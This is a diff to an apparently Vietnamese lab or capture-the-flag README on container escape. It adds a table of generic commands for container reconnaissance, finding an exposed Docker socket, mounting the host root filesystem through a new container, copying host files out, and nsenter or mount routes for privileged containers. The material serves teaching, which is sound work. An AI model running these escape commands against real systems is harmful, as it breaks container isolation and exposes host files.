@@ -36,6 +36,21 @@ Nhập email/mã sinh viên khi được hỏi (flag sinh riêng theo mã của 
 
 ---
 
+## Câu lệnh tham khảo (cú pháp chung — tự ghép, tự điền `<...>`)
+
+| Mục đích | Cú pháp chung |
+|---|---|
+| Trinh sát môi trường container | `cat /proc/1/cgroup` · `grep -i cap /proc/self/status` · `capsh --print` |
+| Tìm dấu hiệu cấu hình sai | `ls -la /var/run/docker.sock` · `ls -la /dev/sd*` · `fdisk -l` |
+| Nói chuyện với daemon host | `docker -H unix:///var/run/docker.sock <SUBCMD>` (vd `version`, `ps`, `images`) |
+| Tạo container mount rootfs host | `docker -H <SOCK> run -d --name <TÊN> -v /:/host <IMAGE> <CMD>` |
+| Lấy file từ host ra | `docker -H <SOCK> cp <TÊN>:/host/<ĐƯỜNG_DẪN> <LOCAL>` |
+| (minh họa) đường privileged | `mount /dev/sda1 /mnt/host` · `nsenter --target 1 --mount --pid -- sh` |
+
+> Đây chỉ là "từ vựng" lệnh. Bạn tự nhận diện cấu hình sai, tự chọn đường escape (bài này đường bắt buộc là **Docker socket**) và tự dựng lệnh.
+
+---
+
 ## Nhiệm vụ 1 — `recon_container`: Trinh sát & nhận diện cấu hình yếu
 **Mục tiêu:** Xác nhận mình đang trong container và tìm (các) điểm cấu hình sai có thể dẫn tới escape.
 
